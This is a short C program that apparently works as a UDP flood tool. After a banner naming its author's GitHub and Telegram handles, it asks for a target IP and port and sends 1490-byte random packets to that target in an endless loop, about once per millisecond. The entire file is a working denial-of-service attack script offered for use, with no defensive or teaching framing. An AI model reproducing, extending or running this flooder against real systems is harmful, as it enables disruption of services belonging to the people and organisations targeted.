#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main() {
    int sock;
    struct sockaddr_in server_addr;
    unsigned char bytes[1490];
    char ip[256];
    char port_str[256];
    int port;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("sock < 0");
        exit(1);
    }
    srand(time(NULL));
    system("clear");
    printf("\n");
    printf("Author   : bytecategory\n");
    printf("Github   : https://github.com/bytecategory\n");
    printf("Telegram     : https://t.me/bytecategory\n");
    printf("\n");
    printf("IP Target : ");
    fgets(ip, sizeof(ip), stdin);
    size_t len = strlen(ip);
    if (len > 0 && ip[len - 1] == '\n') {
        ip[len - 1] = '\0';
    }    
    printf("Port       : ");
    fgets(port_str, sizeof(port_str), stdin);
    port = atoi(port_str); 
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ip);
    server_addr.sin_port = htons(port);
    while (1) {
        for (int i = 0; i < 1490; i++) {
            bytes[i] = (unsigned char)(rand() % 256);
        }
        if (sendto(sock, bytes, 1490, 0, 
                   (struct sockaddr *)&server_addr, 
                   sizeof(server_addr)) < 0) {
            perror("sendto(sock, bytes, 1490, 0, ...) < 0");
        }
        usleep(1000);
    }
    close(sock);
    return 0;
}

